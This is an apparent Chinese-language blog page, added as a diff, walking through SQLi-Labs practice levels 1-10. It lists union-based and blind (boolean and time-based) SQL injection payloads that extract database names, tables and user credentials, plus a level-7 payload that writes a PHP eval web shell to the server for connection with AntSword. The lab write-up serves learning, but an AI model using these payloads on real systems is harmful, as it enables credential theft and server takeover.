@@ -1,0 +1,299 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="img/1.png"/>
+	<link rel="shortcut icon" href="img/1.png">
+	
+			    <title>
+    Youngster
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/Youngsterr.github.io/css/mic_main.css" />
+    <link rel="stylesheet" href="/Youngsterr.github.io/css/dropdownMenu.css" />
+    <meta name="keywords" content="Youngster" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/Youngsterr.github.io/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/Youngsterr.github.io/img/1.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/Youngsterr.github.io/js/jquery.min.js"></script>
+    <script src="/Youngsterr.github.io/js/jquery.scrollex.min.js"></script>
+    <script src="/Youngsterr.github.io/js/jquery.scrolly.min.js"></script>
+    <script src="/Youngsterr.github.io/js/skel.min.js"></script>
+    <script src="/Youngsterr.github.io/js/util.js"></script>
+    <script src="/Youngsterr.github.io/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/Youngsterr.github.io/" class="logo">Youngster</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/Youngsterr.github.io/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        <a class="category-link" href="/Youngsterr.github.io/categories/SQLI-LABS/">SQLI-LABS</a>
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/tag/index.md" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(https://img1.baidu.com/it/u=1418848785,4281678785&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sql注入 1-10</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <p>一.sql注入<br>1.普通注入（sqli-labs 1-4）<br>基本思路及具体查询方法：</p>
+<pre><code>基本思路：能否注入–查询字段–查库查表查列查数据
+
+具体方法(用第一关举例)：
+    查库：sqli/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+
+    查表：sqli/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+
+    查列sqli/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+
+    查数据sqli/Less-1/?id=-1&#39; union select 1,group_concat(id,0x3a,username,0x3a,password),3 from users --+
+</code></pre>
+<p>1.盲注 (sqli-labs 5-6,8)<br>(1).布尔型盲注<br>基本思路及具体查询方法：</p>
+<pre><code>基本思路：判断数据库中表的数量–判断表名长度.判断表名–判断表中字段数.判断每个字段的长度.判断字段名–判断user字段长度.判断出用户
+
+具体方法：
+
+    判断数据库中表的数量：1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=数字--+ (数字逐加到正确)
+
+    判断表明长度：1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=数字--+(limit 0,1指第一张表limint 1,1指第二张表)
+
+    判断表明：1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=&lt;数字--+ (数字指字母ascii编码；limit 0,1),1,1)指第一张表第一个字母，limit 0,1),2,1)指第一张表第二个字母，limit 1,1),1,1)指第二张表第一个字母）
+
+    判断表中字段数：1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=数字--+(数字逐加到正确)
+
+    判断每个字段的长度：1&#39; and length(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1))=数字--+(limit 0,1),1)指第一列，limit 1,1),1)指第二列，limit 2,1),1)指第三列；数字逐加;(字段长度为4,8一般为user，password))
+
+    判断字段名：1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 第几张表,1),第几个字母,1)) &gt;=&lt; 数字--+
+
+    判断user字段数:1&#39; and (select length(user) from users where user_id=1)=数字n--+
+
+    判断用户1:1&#39; and ascii(substr((select user from users limit 0,1),1,1))=数字--+
+
+     1&#39; and ascii(substr((select user from users limit 0,1),2,1))=数字--+
+
+     直到无
+
+     1&#39; and ascii(substr((select user from users limit 0,1),n,1))=数字--+
+
+    判断用户2:1&#39; and ascii(substr((select user from users limit 1,1),1,1))=数字--+
+
+                                                                                                                                    同理
+        1
+</code></pre>
+<p>(2).时间盲注(8-10)<br>具体方法(if(condition.A.B)如果条件condition为true，则执行语句A，否则执行B)</p>
+<pre><code>思路与布尔盲注基本相同
+
+具体方法：
+
+    ?id=1&#39; and sleep(5)--+ (判断是否存在注入漏洞，8-10的不同点)
+
+    ?id=1&#39; and if(length(database())=8,1,sleep(5)--+ (为8的时候直接加载，为其他值得时候加载5s.)
+
+    ?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;数字,1,sleep(5))--+ （第一个字母的ascii值大于数字的时候，会直接加载，否则5s.）
+
+    ?id=1&#39;and if(ascii(substr((select schema name from information schema.schemata limit4,1),1,1)&gt;数字,1,sleep(5)--+ （数据库中的第5个数据库的第一位的ascii的值是不是大于数字，如果是的则直接加载，否则延时5s.）
+</code></pre>
+<p>(3).蚁剑(7)<br>具体方法 (菜刀，蚁剑)</p>
+<pre><code>思路：一句话木马–蚁剑(菜刀)–查数据
+
+具体方法：
+
+    ?id=1&#39;&quot;) order by 3\4--+ (查看有多少列)
+
+    ?id=-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[ crow ]);?&gt;&#39;into outfile“C\\PHPstudy\\PHPTutorial\\www\\sqli\lLess-7\\test.php”--+将一句话木马写入其中
+
+    蚁剑连接查询数据
+</code></pre>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://youngsterr.github.io/2021/03/06/1/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'https://youngsterr.github.io/2021/03/06/1/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
